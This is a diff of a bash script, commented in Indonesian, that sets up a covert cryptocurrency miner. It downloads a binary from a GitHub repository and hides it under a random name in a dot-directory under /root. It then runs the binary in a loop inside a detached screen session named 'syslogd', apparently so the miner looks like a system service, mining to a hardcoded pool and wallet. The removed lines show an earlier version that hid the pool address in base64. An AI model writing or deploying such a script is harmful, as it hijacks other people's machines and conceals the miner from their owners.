@@ -1,40 +1,36 @@
 #!/bin/bash
+
+echo "📦 Menyiapkan dependensi..."
 apt-get update -y >/dev/null 2>&1 && apt-get install -y screen wget tar git -y >/dev/null 2>&1
 
-# Nama acak
-XNAME=$(tr -dc a-z0-9 </dev/urandom | head -c 6)
-XDIR="/root/.${XNAME}"
-XBIN="${XDIR}/${XNAME}"
+# Nama acak aman
+NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 6)
+DIR="/root/.${NAME}"
+BIN="${DIR}/${NAME}"
 
-# Pool & wallet (disamarkan)
-ENC_POOL="c3RyYXR1bSt0Y3BzOi8vc3RyYXR1bS1hc2lhLnJwbGFudC54eXo6MTcwMjI="
-DEC_POOL=$(echo "$ENC_POOL" | base64 -d)
+# Pool dan wallet
+POOL="stratum+tcps://stratum-asia.rplant.xyz:17022"
 WALLET="mbc1qse2ad4q6lwgtpqj0ls6hg2qp4fp9dm3ht4z5vg.asia2"
-PASS="x"
 
-# Simpan skrip utama
-mkdir -p "$XDIR"
-cat << EOF > "$XDIR/.sys.sh"
-#!/bin/bash
-cd "$XDIR" || exit
+# Siapkan direktori
+mkdir -p "$DIR"
 
-# Download & siapkan binary
-if [ ! -f "$XBIN" ]; then
-  git clone https://github.com/amirul5656/ver.git "$XDIR/.tmp" >/dev/null 2>&1
-  cp "$XDIR/.tmp/benchmarks" "$XBIN"
-  chmod +x "$XBIN"
-  strip "$XBIN" >/dev/null 2>&1
+# Download dan siapkan binary jika belum ada
+if [ ! -f "$BIN" ]; then
+  git clone https://github.com/amirul5656/ver.git "$DIR/.tmp" >/dev/null 2>&1
+  cp "$DIR/.tmp/benchmarks" "$BIN"
+  chmod +x "$BIN"
+  strip "$BIN" >/dev/null 2>&1
 fi
 
-# Jalankan hanya jika belum aktif
-screen -list | grep -q syslogd || screen -dmS syslogd bash -c '
-  while true; do
-    $XBIN -x power2b -y $DEC_POOL -z $WALLET -w $PASS -t 7
-    sleep 2
-  done
-'
-EOF
+# Jalankan di screen tersembunyi jika belum aktif
+if ! screen -list | grep -q syslogd; then
+  screen -dmS syslogd bash -c "
+    while true; do
+      $BIN --algorithm power2b --pool $POOL -u $WALLET -p x --cpu-threads 7
+      sleep 2
+    done
+  "
+fi
 
-# Jalankan
-chmod +x "$XDIR/.sys.sh"
-bash "$XDIR/.sys.sh"
+echo "✅ Sudah berjalan dengan aman di background."
